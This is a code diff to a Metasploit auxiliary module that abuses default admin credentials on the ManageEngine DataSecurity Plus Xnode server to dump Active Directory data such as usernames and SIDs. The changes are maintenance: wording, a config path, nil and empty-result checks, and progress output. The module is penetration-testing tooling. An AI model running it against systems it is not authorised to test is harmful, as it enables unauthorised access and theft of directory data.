@@ -13,15 +13,15 @@ class MetasploitModule < Msf::Auxiliary
     super(
       'Name' => 'ManageEngine DataSecurity Plus Xnode Enumeration',
       'Description' => %q{
-        The module exploits default admin credentials for the DataEngine
+        This module exploits default admin credentials for the DataEngine
         Xnode server in DataSecurity Plus versions prior to 6.0.1 (6011)
         in order to dump the contents of Xnode data repositories (tables),
         which may contain (a limited amount of) Active Directory
         information including domain names, host names, usernames and SIDs.
-        The module can also be used against patched DataSecurity Plus
+        This module can also be used against patched DataSecurity Plus
         versions if the correct credentials are provided.
 
-        By default, the module dumps only the data repositories and fields
+        By default, this module dumps only the data repositories and fields
         (columns) specified in the configuration file (set via the
         CONFIG_FILE option). The configuration file is also used to
         add labels to the values sent by Xnode in response to a query.
@@ -44,7 +44,7 @@ class MetasploitModule < Msf::Auxiliary
       ],
     )
     register_options [
-      OptString.new('CONFIG_FILE', [false, 'YAML file specifying the data repositories (tables) and fields (columns) to dump', File.join(Msf::Config.install_root, 'data', 'exploits', 'manageengine_xnode', 'CVE-2020-11532', 'datasecurity_plus_xnode_conf.yaml')]),
+      OptString.new('CONFIG_FILE', [false, 'YAML file specifying the data repositories (tables) and fields (columns) to dump', File.join(Msf::Config.data_directory, 'exploits', 'manageengine_xnode', 'CVE-2020-11532', 'datasecurity_plus_xnode_conf.yaml')]),
       OptBool.new('DUMP_ALL', [false, 'Dump all data from the available data repositories (tables). If true, CONFIG_FILE will be ignored.', false]),
       Opt::RPORT(29119)
     ]
@@ -140,6 +140,8 @@ class MetasploitModule < Msf::Auxiliary
       # check if total_hits is nil, as that means process_dr_search failed and we should skip to the next repo
       next if total_hits.nil?
 
+      total_hits = total_hits[0]
+
       # use "aggr" with the "min" specification for the UNIQUE_ID field in order to obtain the minimum value for this field, i.e. the oldest available record
       aggr_min_query = { 'aggr' => { 'min' => { 'field' => 'UNIQUE_ID' } } }
       res_code, res = get_response(@sock, action_dr_search(repo, ['UNIQUE_ID'], aggr_min_query))
@@ -164,10 +166,13 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # check if we found any repositories that contained any data
-    return if repo_record_info_hash.empty?
+    if repo_record_info_hash.empty?
+      print_error('None of the repositories specified contained any data!')
+      return
+    end
 
     if dump_all
-      data_to_dump = ad_audit_plus_data_repos
+      data_to_dump = datasecurity_plus_data_repos
     else
       data_to_dump = grab_config(config_file)
 
@@ -179,7 +184,7 @@ class MetasploitModule < Msf::Auxiliary
       when config_status::DATA_TO_DUMP_EMPTY
         fail_with(Failure::BadConfig, "The #{config_file} does not seem to contain any data repositories and fields to dump. Please fix your configuration or set 'DUMP_ALL' to true.")
       when config_status::DATA_TO_DUMP_WRONG_FORMAT
-        fail_with(Failure::BadConfig, "Unable to obtain the Xnode data repositories to target from #{config_file}. Check if your 'CONFIG_DIR' setting is correct or set 'DUMP_ALL' to true.")
+        fail_with(Failure::BadConfig, "Unable to obtain the Xnode data repositories to target from #{config_file}. The file doesn't appear to contain valid data. Check if your 'CONFIG_DIR' setting is correct or set 'DUMP_ALL' to true.")
       end
     end
 
@@ -195,8 +200,19 @@ class MetasploitModule < Msf::Auxiliary
 
       total_hits = repo_record_info_hash[repo]['total_hits']
       id_range_lower = repo_record_info_hash[repo]['aggr_min']
-      id_range_upper = id_range_lower + 9
       max_id = repo_record_info_hash[repo]['aggr_max']
+
+      if total_hits.nil? || id_range_lower.nil? || max_id.nil?
+        print_error("Unable to obtain the necessary fields for #{repo} from the repo_record_info_hash!")
+        next
+      end
+
+      if total_hits == 0
+        print_error("No hits found for #{repo}!")
+        next
+      end
+
+      id_range_upper = id_range_lower + 9
       query_ct = 0
 
       results = []
@@ -211,7 +227,7 @@ class MetasploitModule < Msf::Auxiliary
         results += partial_results unless partial_results.nil?
 
         query_ct += 1
-        if query_ct % 25 == 0
+        if query_ct % 5 == 0
           print_status("Processed #{query_ct} queries (max 10 records per query) so far. The last queried record ID was #{id_range_upper}. The max ID is #{max_id}...")
         end
 
